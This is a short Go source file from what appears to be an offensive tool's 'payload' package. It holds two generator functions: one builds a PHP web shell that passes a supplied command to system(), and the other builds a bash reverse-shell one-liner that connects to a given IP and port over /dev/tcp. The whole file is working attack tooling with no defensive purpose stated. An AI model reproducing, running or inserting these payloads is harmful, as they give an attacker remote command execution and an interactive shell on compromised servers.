package payload

func GenPayload(payloadtype, command string) string {
	/*if type payloadtype is php*/
	if payloadtype == "php" {
		data := "<?php system('" + command + "'); ?>"
		return data
	}
	return ""
}

func RevShell(Ip, Port, Type string) string {
	if Type == "bash" {
		data := "bash -i >& /dev/tcp/" + Ip + "/" + Port + " 0>&1"
		return data
	}

	return ""
}
